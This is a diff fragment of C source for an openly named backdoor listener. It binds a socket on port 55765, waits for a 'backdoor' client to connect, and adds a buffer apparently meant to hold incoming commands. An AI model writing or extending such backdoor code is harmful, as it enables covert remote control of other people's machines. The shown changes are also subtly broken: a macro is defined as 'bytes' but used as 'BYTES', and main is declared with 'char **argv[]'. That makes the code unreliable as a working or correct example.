@@ -14,11 +14,13 @@
 #define remote_port 55765
 #define remote_target INADDR_ANY
 
+#define bytes 1024
+
 int main(int argc, char **argv[])
 
 {
-    int target, target_sock, c, read_size;
-
+    int target, target_sock, back, read_size;
+    char command[BYTES]; 
     struct sockaddr_in server, client;
 
     char data_backdoor[2000];
@@ -62,7 +64,7 @@ int main(int argc, char **argv[])
     //Accept and incoming connection
 
     puts("\n** Waiting backdoor connect in **\n");
-    c = sizeof(struct sockaddr_in);
+    back = sizeof(struct sockaddr_in);
 
     //accept connection from an incoming client (backdoor)
 
